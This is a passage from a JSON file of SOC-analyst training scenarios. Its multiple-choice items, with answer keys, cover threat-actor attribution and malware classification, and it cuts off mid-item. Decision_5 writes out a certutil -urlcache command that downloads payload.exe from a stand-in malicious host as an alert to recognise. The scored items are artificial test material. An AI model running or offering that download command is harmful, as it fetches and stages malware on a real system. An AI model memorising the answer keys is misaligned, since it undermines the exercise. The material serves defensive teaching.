            "feedback": "{'short': '6 months of exfiltration suggests intent', 'detailed': 'Negligent insiders cause accidental exposure - misconfigured shares, emailing wrong recipient, lost devices. Systematic exfiltration over 6 months indicates intentional data theft, not negligence. The pattern shows deliberate collection, not accidents.', 'consequence': 'Treating intentional theft as accident leads to inadequate response and continued threat.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cannot determine - could be either until forensic investigation completes",
            "feedback": "{'short': 'We have enough indicators to assess likelihood', 'detailed': \"While forensics will provide certainty, the combination of indicators (legitimate access, no external tools, behavioral motivator) strongly suggests insider threat. You don't need to wait for complete forensics to begin appropriate response - restrict access, preserve evidence, involve HR.\", 'consequence': 'Delayed response while waiting for unnecessary certainty.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What's notable about WHAT'S MISSING - no malware, no C2, no external indicators?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Insiders don't need hacker tools - they have legitimate access. The absence of external attack indicators combined with behavioral motivators suggests insider."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Target Selection Analysis",
        "situation": "Martinez presents data: 'Over the past year, a threat actor has attacked: 3 aerospace defense contractors, 2 military think tanks, 1 defense-focused university research lab, and 1 government agency handling export controls. All attacks used similar TTPs - spear-phishing, custom RAT, focus on technical documents. What does target selection tell us?'\n\n**Question:** What does this target selection pattern indicate about the threat actor?",
        "options": [
          {
            "id": "A",
            "text": "Financially motivated - defense contractors have money",
            "feedback": "{'short': 'No financial indicators in the targeting', 'detailed': \"Financially motivated actors target based on ABILITY TO PAY or VALUABLE DATA TO SELL. They'd hit healthcare, retail, financial services - sectors that pay ransoms or have monetizable data. Exclusively targeting defense/aerospace with focus on technical documents indicates espionage motivation, not financial.\", 'consequence': 'Completely wrong motivation assessment. Expect ransom demands that never come.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Nation-state espionage - consistent targeting of defense sector suggests state intelligence collection",
            "feedback": "{'short': 'Correct! Target selection reveals strategic motivation', 'detailed': \"The exclusive focus on defense/aerospace/military targets indicates an actor interested in defense technology and capabilities - that's nation-state intelligence collection. Think tanks and university research extend the intelligence picture. Export control agency suggests interest in understanding what technology is protected. This is classic military/technical espionage targeting.\", 'consequence': 'Correct assessment enables appropriate counterintelligence response and information sharing.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Hacktivist - targeting military-industrial complex for ideological reasons",
            "feedback": "{'short': 'Hacktivists publicize attacks, not steal quietly', 'detailed': \"Hacktivists targeting the defense industry would leak data publicly with political statements, deface websites, or conduct DDoS. They want attention for their cause. This actor is using custom RATs and stealing technical documents quietly - that's espionage methodology, not hacktivism.\", 'consequence': \"Expect public leaks that don't happen. Miss the ongoing quiet espionage.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Competitive intelligence - rival defense company stealing trade secrets",
            "feedback": "{'short': 'Too broad targeting for corporate espionage', 'detailed': \"Corporate espionage typically targets specific competitors. This actor is targeting across the entire defense sector including government and think tanks. A rival company wouldn't target think tanks and export control agencies - they'd focus on direct competitors. The breadth suggests nation-state collection across the sector.\", 'consequence': 'Look for corporate rival while nation-state continues collection.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What connects all these targets? Who would want intelligence from all of them?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Exclusive defense sector targeting (contractors, think tanks, university research, export control) indicates strategic intelligence collection - nation-state espionage."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "TTP Analysis",
        "situation": "'Let's look at techniques,' Martinez says. 'An attack showed: initial access via watering hole (compromised industry website), followed by browser exploit dropping custom malware, extensive internal reconnaissance over weeks, careful data staging before exfiltration, exfiltration via DNS tunneling to avoid detection. What does this TTP profile indicate?'\n\n**Question:** What does this TTP profile indicate about the threat actor?",
        "options": [
          {
            "id": "A",
            "text": "Low sophistication - watering holes are an old technique",
            "feedback": "{'short': 'Watering holes require significant capability', 'detailed': 'Watering holes require: identifying the right website, compromising it without detection, deploying exploit code, and maintaining access. Combined with browser exploit (often requires 0-day or recent vulnerability), custom malware, patient reconnaissance, and DNS tunneling for stealth - this is HIGH sophistication, not low.', 'consequence': 'Underestimate threat. Inadequate response to sophisticated actor.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "High sophistication - patient operation with custom tools and stealth techniques",
            "feedback": "{'short': 'Correct! Multiple high-sophistication indicators', 'detailed': 'High sophistication throughout: watering hole (strategic compromise), browser exploit (requires exploit development capability), custom malware (not commodity tools), extended reconnaissance (patience over speed), careful staging (operational security), DNS tunneling (stealth exfiltration). This TTP profile indicates a well-resourced, patient threat actor - likely nation-state or sophisticated criminal.', 'consequence': 'Appropriate response to sophisticated threat. Enhanced detection and response measures.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Medium sophistication - some custom elements but standard techniques",
            "feedback": "{'short': 'Multiple advanced techniques indicate high sophistication', 'detailed': \"The combination of watering hole + browser exploit + custom malware + DNS tunneling is NOT standard. Each element requires significant capability, and the patient operational approach indicates resources and planning. This is above 'medium' sophistication.\", 'consequence': 'Underweight response to sophisticated threat.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Cannot assess sophistication from techniques alone",
            "feedback": "{'short': 'TTPs are primary sophistication indicators', 'detailed': \"Techniques, Tactics, and Procedures (TTPs) are exactly how we assess sophistication. Custom tools, exploit development, operational patience, and stealth measures all indicate capability level. You don't need to identify the specific actor to assess sophistication from TTPs.\", 'consequence': 'Fail to use available intelligence for threat assessment.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider each technique: watering hole, browser exploit, custom malware, DNS tunneling. How hard are these?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Custom malware + exploit development + stealth exfiltration + patient operations = sophisticated, well-resourced threat actor."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Comprehensive Assessment",
        "situation": "Martinez concludes with a complex scenario: 'A pharmaceutical company reports: attackers accessed COVID vaccine research data, used phishing initially, deployed known APT29 tooling, exfiltrated research documents to cloud storage, attack timed during vaccine approval process. Multiple countries have accused each other of vaccine espionage. Provide your complete threat actor assessment.'\n\n**Question:** What is your comprehensive threat actor assessment?",
        "options": [
          {
            "id": "A",
            "text": "APT29 (Russia) - high confidence based on tooling, motivation aligns with vaccine espionage",
            "feedback": "{'short': 'Correct! Comprehensive assessment with appropriate confidence', 'detailed': 'Strong assessment: Technical indicators (APT29 tooling), targeting (vaccine research = strategic intelligence), timing (during critical approval period), and known context (multiple governments including Russia accused of vaccine espionage). APT29 specifically was identified in 2020 vaccine research targeting by NCSC/CISA. High confidence attribution based on multiple corroborating indicators.', 'consequence': 'Accurate threat intelligence enables appropriate government notification, defense coordination, and executive briefing.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Cannot attribute - multiple nations accused of vaccine espionage, could be false flag",
            "feedback": "{'short': 'Technical indicators support attribution despite geopolitical noise', 'detailed': 'Yes, multiple nations were accused of vaccine espionage, but we have TECHNICAL INDICATORS (APT29 tooling) not just circumstantial evidence. Tool matching provides strong attribution evidence. While false flags are possible, refusing to attribute when technical evidence supports it wastes valuable intelligence.', 'consequence': \"Valuable threat intelligence unused. Generic 'nation-state' briefing instead of specific, actionable attribution.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Likely criminal - vaccine research could be sold to highest bidder",
            "feedback": "{'short': 'Tooling and targeting indicate nation-state', 'detailed': 'Criminal groups could theoretically steal and sell vaccine research, but: (1) APT29 tooling indicates nation-state, (2) criminals would more likely demand ransom, (3) the strategic timing during approval suggests intelligence motivation. No indicators point to criminal actor.', 'consequence': \"Wrong actor classification. Expect financial demands that don't come.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hacktivist - targeting pharmaceutical company for ideological reasons",
            "feedback": "{'short': 'Nothing indicates hacktivist motivation', 'detailed': 'Hacktivists would: leak data publicly with messaging, claim credit, target for ideology (not steal research quietly). This is quiet exfiltration of strategic intelligence using nation-state tools. No hacktivist indicators present.', 'consequence': 'Completely wrong classification. Miss the nation-state espionage threat.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What does the combination of tooling (APT29) and targeting (vaccine research) tell you?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "APT29 tooling + strategic targeting + known context of nation-state vaccine espionage = high confidence APT29 attribution."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-REM-002",
    "title": "Malware Menagerie",
    "domain": 2,
    "type": "REM",
    "difficulty": "foundational",
    "time_estimate": "30-40 minutes",
    "role": "SOC Analyst Trainee",
    "organization": {
      "name": "SecureLearn Training Institute",
      "industry": "Malware Analysis Training Lab"
    },
    "introduction": "Welcome to the Malware Analysis fundamentals course. Dr. Chen greets you at the isolated training lab. 'Understanding malware - what it is, how it behaves, and how to identify it - is fundamental to security operations. Today we'll examine different malware types, learn to recognize their behaviors, and practice identifying indicators of compromise. By the end, you'll be able to look at an alert or artifact and understand what you're dealing with.'",
    "learning_objectives": [
      "Given a scenario, analyze indicators of malicious activity"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Basic Malware Classification",
        "situation": "Dr. Chen starts with fundamentals. 'An analyst reports: user opened email attachment, Word spawned PowerShell, PowerShell downloaded and executed a file, the file is now communicating with an external server and the attacker has remote shell access. What category of malware is the initial Word document?'\n\n**Question:** What type of malware is the Word document that started this infection chain?",
        "options": [
          {
            "id": "A",
            "text": "Virus - it infected the Word application",
            "feedback": "{'short': 'Viruses replicate by attaching to files', 'detailed': \"A virus would attach itself to other executable files and spread when those files are run. This Word document isn't replicating or attaching to other files - it's a document that tricks the user into enabling malicious macros. The document itself is a delivery mechanism, not a self-replicating virus.\", 'consequence': 'Misclassification leads to wrong detection strategy.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Trojan - it appears legitimate but delivers malicious payload",
            "feedback": "{'short': 'Correct! Classic trojan behavior', 'detailed': \"This is a trojan: it appears to be a legitimate document (invoice, resume, etc.) but when opened, it executes malicious code via macros. Trojans don't self-replicate - they rely on social engineering to get users to run them. The Word doc is a 'dropper' trojan that delivers the next stage payload.\", 'consequence': 'Correct classification informs user awareness focus and email security priorities.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Worm - it's spreading through the network",
            "feedback": "{'short': 'Worms spread automatically without user action', 'detailed': \"Worms self-propagate by exploiting vulnerabilities - they don't require user interaction. This malware required the user to open the document and enable macros. The attacker might later move laterally, but the initial document isn't a worm - it's a trojan that needed user action to execute.\", 'consequence': 'Focus on network segmentation when email security is the issue.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "RAT - the attacker has remote access",
            "feedback": "{'short': 'RAT is the payload, not the initial document', 'detailed': \"You're right that a RAT (Remote Access Trojan) is involved - the attacker has shell access. But the question asks about the WORD DOCUMENT. The document is a trojan dropper that delivered the RAT. The RAT is the final payload; the document is the delivery mechanism (also a trojan, specifically a dropper).\", 'consequence': 'Confusing delivery mechanism with payload.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What kind of malware relies on tricking users into executing it rather than self-replicating?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Trojans disguise themselves as legitimate files. A malicious Word document is a classic trojan dropper."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Identifying Indicators of Compromise",
        "situation": "'Good. Now let's talk about IoCs,' Dr. Chen continues. 'You're investigating a compromised system. You find: a file hash matching known malware, registry key for persistence, and the malware is connecting to a specific IP address. Which indicator would you prioritize sharing with other teams for IMMEDIATE blocking?'\n\n**Question:** Which IoC should be prioritized for IMMEDIATE blocking across the environment?",
        "options": [
          {
            "id": "A",
            "text": "File hash - block this specific malware everywhere",
            "feedback": "{'short': 'Useful but easily changed by attackers', 'detailed': 'File hashes are useful for detecting specific malware samples, but attackers can trivially change hashes by recompiling or modifying a single byte. If you only block the hash, the attacker can generate a new variant that bypasses your block. Hashes are good for detection but less effective for blocking.', 'consequence': 'Hash blocked. Attacker uses different variant with new hash. Attack continues.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "C2 IP address - block attacker's command and control",
            "feedback": "{'short': 'Correct! Block C2 to disrupt active operations', 'detailed': \"Blocking the C2 IP address immediately disrupts the attacker's ability to control compromised systems. While attackers can change infrastructure, doing so takes time and may require malware updates. Blocking C2 buys time and may sever existing compromises. This is the highest-impact immediate action.\", 'consequence': \"C2 blocked. Existing compromises can't receive commands. Attacker must establish new infrastructure.\"}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Registry key - remove persistence mechanism",
            "feedback": "{'short': 'Important for remediation but not blocking', 'detailed': \"Registry keys used for persistence are important for cleaning up infected systems, but they're not 'blockable' in the traditional sense - you remove them during remediation. The registry key path is useful for hunting but not for immediate network-level blocking.\", 'consequence': 'Registry key documented for cleanup. C2 communication continues unchecked.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "All indicators equally - comprehensive blocking is best",
            "feedback": "{'short': 'Prioritization matters for immediate response', 'detailed': 'All indicators are valuable, but immediate response requires prioritization. C2 IP can be blocked at the firewall in minutes to disrupt active attacks. Hashes take time to deploy to all endpoints. Registry keys require system-by-system remediation. Block C2 first, then address other indicators.', 'consequence': 'Time spent on comprehensive approach while C2 communication continues.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Which indicator, when blocked, immediately disrupts the attacker's ability to control compromised systems?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "C2 infrastructure is how attackers command their malware. Blocking C2 severs the attacker's control."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Worm vs Other Malware",
        "situation": "Dr. Chen presents a scenario: 'A hospital network is hit: within 2 hours, 500 computers display ransom notes. The malware exploited EternalBlue (MS17-010) to spread from the initial infected machine to all others automatically. No user interaction was required after the first infection. What type of malware is this?'\n\n**Question:** What type of malware caused this rapid spread across the hospital network?",
        "options": [
          {
            "id": "A",
            "text": "Ransomware - it encrypted files and demanded ransom",
            "feedback": "{'short': 'Ransomware describes the payload, not the propagation', 'detailed': \"The malware IS ransomware (it encrypts and demands payment), but the question asks about the TYPE based on behavior. The key characteristic here is AUTOMATIC PROPAGATION via vulnerability exploitation without user interaction. That's the defining characteristic of a worm. This is a ransomware worm - it combines worm propagation with ransomware payload.\", 'consequence': 'Focus on ransomware response without addressing worm propagation vector.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Worm - it spreads automatically by exploiting vulnerabilities",
            "feedback": "{'short': 'Correct! Self-propagation via exploit = worm', 'detailed': 'This describes WannaCry - a ransomware WORM. The defining characteristic of a worm is self-propagation without user interaction, typically by exploiting vulnerabilities. This malware exploited EternalBlue (SMB vulnerability) to spread automatically across the network. The ransomware payload is what it does; the worm is how it spreads.', 'consequence': 'Correct classification prioritizes patching and network segmentation to stop spread.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Trojan - it was delivered via initial infection",
            "feedback": "{'short': \"Trojans don't self-propagate\", 'detailed': \"The INITIAL infection might have been via trojan (user opening malicious file), but the spread to 500 machines wasn't via 500 users opening files - it was automatic exploitation. Trojans require user action for each infection. Self-propagation via vulnerability = worm.\", 'consequence': 'Focus on user awareness when the propagation is vulnerability-based.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Botnet - it affected many computers",
            "feedback": "{'short': 'Botnet describes coordinated control, not propagation method', 'detailed': 'A botnet is a network of compromised computers under attacker control - it describes the END STATE, not the propagation method. Botnets CAN be built by worms, trojans, or other methods. The question asks about the type based on HOW it spread - automatic vulnerability exploitation = worm.', 'consequence': 'Confusing malware type with infection outcome.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What type of malware spreads automatically by exploiting vulnerabilities without user action?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Worms are defined by self-propagation. WannaCry was a ransomware worm - worm propagation with ransomware payload."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Behavioral Indicator Analysis",
        "situation": "'Let's look at behaviors,' Dr. Chen says. 'Your EDR flags this sequence: Word.exe \u00e2\u2020\u2019 PowerShell.exe \u00e2\u2020\u2019 encoded command \u00e2\u2020\u2019 downloads file from internet \u00e2\u2020\u2019 creates scheduled task \u00e2\u2020\u2019 connects to external IP every 4 hours. What behavior pattern is this describing?'\n\n**Question:** What malware behavior pattern does this sequence represent?",
        "options": [
          {
            "id": "A",
            "text": "Data exfiltration - stealing information from the system",
            "feedback": "{'short': 'No data theft indicators in this sequence', 'detailed': 'Data exfiltration would show: accessing sensitive files, staging/compressing data, uploading large amounts of data. This sequence shows: initial execution, download (inbound, not outbound), persistence (scheduled task), and C2 beacon (periodic contact, not bulk transfer). This is establishing access, not stealing data.', 'consequence': 'Focus on DLP when the issue is initial access and persistence.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Initial access and persistence with C2 beacon",
            "feedback": "{'short': 'Correct! Classic initial infection establishing foothold', 'detailed': 'This shows the classic infection chain: Initial Access (Word macro \u00e2\u2020\u2019 PowerShell), Execution (encoded command downloads payload), Persistence (scheduled task ensures survival), and C2 (periodic beacon every 4 hours maintains communication). This is an attacker establishing their foothold and maintaining access for future operations.', 'consequence': 'Correct identification enables complete remediation: remove persistence, block C2, clean payload.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Lateral movement - spreading to other systems",
            "feedback": "{'short': 'No indication of spreading to other systems', 'detailed': 'Lateral movement would show: credential theft, authentication to other systems, RDP/SMB connections to other hosts. This sequence is all about establishing foothold on ONE system: executing payload, creating persistence, establishing C2. Lateral movement typically comes after this initial foothold is established.', 'consequence': \"Hunt for lateral movement that hasn't happened yet while initial access continues.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Ransomware deployment - preparing to encrypt",
            "feedback": "{'short': 'No encryption indicators present', 'detailed': \"Ransomware deployment would show: shadow copy deletion, mass file modification, ransom note creation. This sequence shows initial access and persistence - these might LEAD to ransomware eventually, but what we're seeing here is establishing the foothold. The 4-hour beacon suggests ongoing access, not imminent encryption.\", 'consequence': 'Expect ransomware immediately when this is early-stage access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Break down the sequence: execution chain, then what? Persistence and regular communication suggest what?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Scheduled task = persistence (surviving reboot). Regular external connection = C2 beacon. This is establishing and maintaining access."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Living Off the Land Detection",
        "situation": "Dr. Chen shows an alert: 'Process: certutil.exe, Command: certutil -urlcache -split -f http://malicious.com/payload.exe C:\\Windows\\Temp\\update.exe, Parent: cmd.exe, Grandparent: Excel.exe. Is this malicious?'\n\n**Question:** Is this certutil activity malicious?",
        "options": [
          {
            "id": "A",
            "text": "No - certutil is a legitimate Windows tool",
            "feedback": "{'short': 'Legitimate tools can be abused', 'detailed': \"Certutil IS a legitimate Windows tool for certificate management. However, it's being ABUSED here to download a file from the internet - the '-urlcache' parameter turns it into a file downloader. The process ancestry (Excel \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil downloading from external URL) is classic Living Off the Land abuse. Legitimacy of the tool doesn't mean legitimate use.\", 'consequence': \"Malicious activity missed because the tool is 'legitimate.'\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Yes - LOLBin abuse: certutil downloading file, spawned from Excel via cmd",
            "feedback": "{'short': 'Correct! Classic LOLBin abuse pattern', 'detailed': \"This is textbook LOLBin (Living Off the Land Binary) abuse: Excel (macro) \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil downloading from internet. Certutil's -urlcache parameter is commonly abused to download malware while bypassing application whitelisting (certutil is signed by Microsoft). The process chain and external URL download make this clearly malicious.\", 'consequence': 'Correct identification enables blocking this technique and investigating the malicious document.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Need more information - could be legitimate admin activity",
            "feedback": "{'short': 'Process ancestry tells us enough', 'detailed': \"The process ancestry is conclusive: Excel spawning cmd spawning certutil to download from external URL is NOT legitimate admin activity. Admins don't use Excel to run certutil to download files. This is a malicious macro using LOLBins. The pattern itself is the indicator - no additional context needed.\", 'consequence': 'Delay investigation while gathering unnecessary context.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Suspicious but not conclusive - monitor for further activity",
            "feedback": "{'short': 'This IS conclusive - act now', 'detailed': \"This pattern is conclusive for malicious activity. Excel \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil -urlcache to external URL is a known malicious pattern. Waiting to 'monitor for further activity' means letting the downloaded payload execute. Investigate and remediate immediately.\", 'consequence': \"Payload executes while waiting for 'further activity.'\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Look at the process chain: what legitimate reason would Excel have to spawn certutil downloading from the internet?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "LOLBin abuse: legitimate tools used maliciously. Certutil -urlcache is commonly abused to download files. Excel \u00e2\u2020\u2019 cmd \u00e2\u2020\u2019 certutil is classic macro abuse."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "C2 Communication Patterns",
        "situation": "'Command and control is how attackers maintain access,' Dr. Chen explains. 'You observe network traffic: HTTPS connections to a random-looking domain every 4 hours, small data transfers (< 1KB), connections persist for exactly 30 seconds each time. What does this pattern indicate?'\n\n**Question:** What type of malicious network activity does this pattern indicate?",
        "options": [
          {
            "id": "A",
            "text": "Data exfiltration - small but regular transfers indicate stolen data",
            "feedback": "{'short': \"Small transfers don't fit exfiltration pattern\", 'detailed': 'Data exfiltration typically involves larger, irregular transfers (documents, databases, etc.). Sub-1KB regular transfers with consistent timing are too small for meaningful data theft and too regular to be natural usage. This pattern fits C2 beacon behavior - checking in for commands, not stealing data.', 'consequence': 'DLP investigation when the issue is C2 communication.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "C2 beacon - regular check-ins with command and control server",
            "feedback": "{'short': 'Correct! Classic beacon pattern', 'detailed': \"This is textbook C2 beacon behavior: regular interval (every 4 hours), small payload (< 1KB = 'any commands?'), consistent duration (30 seconds = standard timeout), encrypted channel (HTTPS). Beacons check in periodically to receive commands. The regularity and small size distinguish this from legitimate traffic or data exfiltration.\", 'consequence': 'C2 identified. Can block domain/IP, hunt for other infected systems with same pattern.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Legitimate application update check",
            "feedback": "{'short': 'Update checks go to known domains, not random ones', 'detailed': 'Legitimate update checks go to recognizable vendor domains (microsoft.com, adobe.com), not random-looking domains. While the pattern (periodic, small) might superficially resemble update checks, the domain characteristic is the giveaway. Malware uses random or algorithmically generated domains for C2.', 'consequence': \"Malicious traffic missed because pattern 'looks like' updates.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "DNS tunneling for covert communication",
            "feedback": "{'short': 'This is HTTPS, not DNS-based', 'detailed': 'DNS tunneling encodes data in DNS queries, not HTTPS traffic. The scenario describes HTTPS connections, which is standard web C2, not DNS tunneling. DNS tunneling would show unusual DNS query patterns, large/encoded TXT records, or high query volumes to unusual domains.', 'consequence': 'Looking for wrong communication type.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What network pattern shows regular small check-ins rather than data theft?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "C2 beacons: regular intervals, small payloads (checking for commands), consistent timing. Data exfiltration would be larger, irregular transfers."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Pre-Ransomware Indicators",
        "situation": "Dr. Chen presents a sequence: 'Tuesday: initial access via RDP. Wednesday: Mimikatz detected on DC. Thursday: rclone installed, 400GB transferred to Mega.nz. Friday: PsExec used to push executable to 50 servers. What's about to happen?'\n\n**Question:** Based on this timeline, what attack phase is imminent?",
        "options": [
          {
            "id": "A",
            "text": "Initial access - the attack is just beginning",
            "feedback": "{'short': 'Initial access already happened Tuesday', 'detailed': \"Initial access was Tuesday via RDP. We're now 4 days into the attack. The attacker has: compromised domain credentials (Mimikatz on DC), exfiltrated data (400GB to Mega), and staged malware on 50 servers (PsExec push). We're at the END of the attack chain, not the beginning.\", 'consequence': \"Thinking the attack is beginning when it's about to conclude.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Data exfiltration - they're stealing information",
            "feedback": "{'short': 'Exfiltration already happened Thursday', 'detailed': \"Data exfiltration happened Thursday - 400GB already transferred to Mega.nz. That phase is complete. The question asks what's ABOUT to happen. The PsExec distribution of executables to 50 servers is the current activity - that's staging for the next phase. What comes after data theft and malware staging in ransomware operations?\", 'consequence': 'Focus on past exfiltration while ransomware deployment is imminent.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Ransomware deployment - executable staged on servers, encryption imminent",
            "feedback": "{'short': 'Correct! Final stage of ransomware attack', 'detailed': \"This is the ransomware playbook: Initial access (RDP) \u00e2\u2020\u2019 Credential theft (Mimikatz) \u00e2\u2020\u2019 Data exfiltration (rclone/Mega) \u00e2\u2020\u2019 Mass deployment (PsExec to 50 servers). The executable pushed to servers is ransomware. Exfiltration before encryption enables double extortion ('pay or we leak'). Ransomware execution is imminent - likely this weekend.\", 'consequence': 'Correct identification enables emergency response: isolate network, prevent ransomware execution.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Lateral movement - spreading to more systems",
            "feedback": "{'short': 'Lateral movement already happened', 'detailed': \"Lateral movement happened throughout the week - compromising the DC, moving to servers. The PsExec to 50 servers isn't spreading for more access - it's DEPLOYING ransomware to systems already accessed. This is the deployment phase, not the spreading phase.\", 'consequence': 'Try to stop lateral movement that already happened instead of preventing ransomware execution.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What happens after data exfiltration in a double extortion ransomware attack?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Ransomware playbook: access \u00e2\u2020\u2019 credentials \u00e2\u2020\u2019 exfiltrate \u00e2\u2020\u2019 deploy ransomware. PsExec to 50 servers = mass deployment = encryption imminent."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Fileless Malware Recognition",
        "situation": "'Not all malware writes files to disk,' Dr. Chen notes. 'You see: PowerShell process with encoded command, decodes to download script from internet, script runs entirely in memory, no new files on disk, but system is now beaconing to external C2. What malware technique is this?'\n\n**Question:** What malware technique is being used here?",
        "options": [
          {
            "id": "A",
            "text": "Traditional trojan with disk-based payload",
            "feedback": "{'short': 'No files written to disk', 'detailed': \"Traditional malware writes executable files to disk. This scenario explicitly states 'no new files on disk' - the payload runs entirely in memory. This is fileless malware, specifically designed to avoid disk-based detection.\", 'consequence': 'File-based scanning finds nothing while system remains compromised.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
